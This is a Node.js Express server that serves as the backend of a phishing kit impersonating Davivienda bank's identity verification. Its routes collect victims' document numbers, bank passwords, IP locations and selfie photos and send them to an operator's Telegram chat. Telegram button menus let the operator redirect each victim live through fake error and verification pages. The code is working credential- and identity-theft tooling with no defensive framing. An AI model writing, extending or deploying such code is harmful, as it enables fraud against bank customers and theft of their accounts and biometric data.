// 📦 Backend - Sistema Davivienda KYC

const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');
const app = express();

const corsOptions = {
  origin: '*', 
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn("[WARN] BOT_TOKEN o CHAT_ID no definidos.");
}

const redirections = new Map();

const getTelegramApiUrl = (method) => `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;

app.get('/', (_req, res) => {
  res.send({ 
    ok: true, 
    service: 'davivienda-kyc-backend', 
    hasEnv: !!(BOT_TOKEN && CHAT_ID),
    version: '1.0.2'
  });
});

// ====================================================================================
// 🎯 FUNCIONES DE MENÚ PARA CADA PASO - CORREGIDO
// ====================================================================================

// Menú 1: Nuevo Ingreso
function getMenuNuevoIngreso(sessionId) {
    return {
        inline_keyboard: [
            [
                { text: "❌ Error Logo", callback_data: `errorlogo_${sessionId}` },
                { text: "✅ Aceptar", callback_data: `parental_${sessionId}` }
            ],
            [
                { text: "📸 KYC", callback_data: `verify_${sessionId}` },
                { text: "🏠 Home", callback_data: `home1_${sessionId}` }
            ]
        ]
    };
}

// Menú 2: Paso Aceptar
function getMenuPasoAceptar(sessionId) {
    return {
        inline_keyboard: [
            [
                { text: "❌ Error Logo", callback_data: `index_${sessionId}` },
                { text: "✅ Aceptar", callback_data: `parental_${sessionId}` }
            ],
            [
                { text: "📸 KYC", callback_data: `verify_${sessionId}` },
                { text: "🏠 Home", callback_data: `home2_${sessionId}` }
            ]
        ]
    };
}

// Menú 3: KYC Completo
function getMenuKYCCompleto(sessionId) {
    return {
        inline_keyboard: [
            [
                { text: "❌ Error Logo", callback_data: `errorlogo_${sessionId}` },
                { text: "✅ Aceptar", callback_data: `parental_${sessionId}` }
            ],
            [
                { text: "⚠️ KYC-ERROR", callback_data: `verify_${sessionId}` },
                { text: "🔄 Nuevo Intento", callback_data: `index_${sessionId}` }
            ],
            [
                { text: "🏠 Home", callback_data: `home3_${sessionId}` }
            ]
        ]
    };
}

// ====================================================================================
// 📨 RUTA 1: NUEVO INGRESO
// ====================================================================================
app.post('/nuevo-ingreso', async (req, res) => {
  try {
    const { sessionId, docu, clave, ip, country, city } = req.body;
    
    if (!BOT_TOKEN || !CHAT_ID) {
      console.error("❌ BOT_TOKEN o CHAT_ID no definidos");
      return res.status(500).send({ ok: false, reason: "Env vars undefined" });
    }

    const mensaje = `
🆕 NUEVO INGRESO
📄 Doc: ${docu}
🔑 Clave: ${clave}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    const reply_markup = getMenuNuevoIngreso(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    console.log('✅ Nuevo ingreso enviado:', docu);
    res.send({ ok: true });
    
  } catch (error) {
    console.error('❌ ERROR EN /nuevo-ingreso');
    if (error.response) {
      console.error('📄 RESPONSE:', error.response.data);
    }
    console.error('🧠 ERROR:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ====================================================================================
// 📨 RUTA 2: PASO ACEPTAR
// ====================================================================================
app.post('/paso-aceptar', async (req, res) => {
  try {
    const { sessionId, docu, clave, ip, country, city } = req.body;
    
    const mensaje = `
✅ PASO ACEPTAR - OJO YA CASI KYC
📄 Doc: ${docu}
🔑 Clave: ${clave}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    redirections.set(sessionId, null);
    const reply_markup = getMenuPasoAceptar(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    console.log('✅ Paso aceptar enviado:', docu);
    res.send({ ok: true });
    
  } catch (error) {
    console.error('❌ ERROR EN /paso-aceptar');
    if (error.response) {
      console.error('📄 RESPONSE:', error.response.data);
    }
    console.error('🧠 ERROR:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ====================================================================================
// 📨 RUTA 3: KYC COMPLETO (CON FOTO)
// ====================================================================================
app.post('/kyc-completo', async (req, res) => {
  try {
    const { sessionId, docu, clave, photo, ip, country, city } = req.body;
    
    if (!photo) {
      return res.status(400).json({ ok: false, reason: "No se recibió la foto" });
    }

    // Convertir base64 a buffer
    const base64Data = photo.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    const caption = `
📸 KYC COMPLETADO
📄 Doc: ${docu}
🔑 Clave: ${clave}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    // Enviar foto con form-data
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', buffer, {
      filename: 'selfie.jpg',
      contentType: 'image/jpeg'
    });
    formData.append('caption', caption);

    await axios.post(getTelegramApiUrl('sendPhoto'), formData, {
      headers: {
        ...formData.getHeaders()
      }
    });

    // Enviar menú en mensaje separado
    redirections.set(sessionId, null);
    const reply_markup = getMenuKYCCompleto(sessionId);
    
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: '👆 Selecciona la siguiente acción:',
      reply_markup
    });

    console.log('✅ KYC completo enviado con foto:', docu);
    res.send({ ok: true });
    
  } catch (error) {
    console.error('❌ ERROR EN /kyc-completo');
    if (error.response) {
      console.error('📄 RESPONSE:', error.response.data);
    }
    console.error('🧠 ERROR:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ====================================================================================
// 📄 WEBHOOK CON ELIMINACIÓN DE MENÚ - CORREGIDO
// ====================================================================================
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    const update = req.body;
    const { callback_query } = update;
    
    if (callback_query) {
      const callbackData = callback_query.data || '';
      console.log('📥 Callback recibido:', callbackData);
      
      // Dividir por guion bajo: accion_sessionId
      const parts = callbackData.split('_');
      const action = parts[0];
      const sessionId = parts.slice(1).join('_'); // Por si el sessionId tiene guiones bajos
      
      console.log('🎯 Acción:', action);
      console.log('🆔 SessionId:', sessionId);
      
      // Eliminar menú al presionar cualquier botón
      try {
        await axios.post(getTelegramApiUrl('editMessageReplyMarkup'), {
          chat_id: callback_query.message.chat.id,
          message_id: callback_query.message.message_id,
          reply_markup: { inline_keyboard: [] }
        });
      } catch (editError) {
        console.log('⚠️ No se pudo eliminar el menú');
      }
      
      // Manejo de redirección según la acción
      let redirectUrl = null;
      
      switch(action) {
        case 'errorlogo':
          redirectUrl = 'errorlogo.html';
          break;
        case 'parental':
          redirectUrl = 'parental.html';
          break;
        case 'verify':
          redirectUrl = 'verify.html';
          break;
        case 'index':
          redirectUrl = 'index.html';
          break;
        case 'home1':
          redirectUrl = 'https://davivienda.com/personas/cuentas';
          break;
        case 'home2':
          redirectUrl = 'https://youtube.com';
          break;
        case 'home3':
          redirectUrl = 'https://davivienda.com/personas/cuentas';
          break;
        default:
          redirectUrl = 'index.html';
      }
      
      redirections.set(sessionId, redirectUrl);
      
      await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
        callback_query_id: callback_query.id,
        text: `Redirigiendo → ${action}`,
        show_alert: false
      });

      console.log(`📄 Redirección configurada: ${sessionId} → ${redirectUrl}`);
    }
    res.sendStatus(200);
  } catch (err) {
    console.error("❌ Error en webhook:", err);
    res.sendStatus(200);
  }
});

// ====================================================================================
// 🔍 ENDPOINT DE INSTRUCCIONES (POLLING)
// ====================================================================================
app.get('/instruction/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const target = redirections.get(sessionId);
  
  if (target) {
    console.log(`✅ Redirección encontrada: ${sessionId} → ${target}`);
    redirections.delete(sessionId);
    res.send({ redirect_to: target });
  } else {
    res.send({});
  }
});

// ====================================================================================
// 🚀 INICIAR SERVIDOR
// ====================================================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════════╗
║   ✅ SERVIDOR DAVIVIENDA KYC ACTIVO      ║
║   📡 Puerto: ${PORT}                        ║
║   🤖 Bot: ${BOT_TOKEN ? 'Configurado ✓' : 'No configurado ✗'}     ║
║   💬 Chat: ${CHAT_ID ? 'Configurado ✓' : 'No configurado ✗'}    ║
║   📸 Envío de fotos: CORREGIDO ✓         ║
║   🔧 Callback data: CORREGIDO ✓          ║
╚═══════════════════════════════════════════╝
  `);
});

// ====================================================================================
// 🔄 AUTO-PING (evitar que Render duerma el servicio)
// ====================================================================================
setInterval(async () => {
  try {
    const response = await fetch(`https://nuevofeeddavid.onrender.com`);
    const data = await response.json();
    console.log("🔄 Auto-ping realizado:", data.service);
  } catch (error) {
    console.error("❌ Error en auto-ping:", error.message);
  }

}, 300000); // Cada 5 minutos
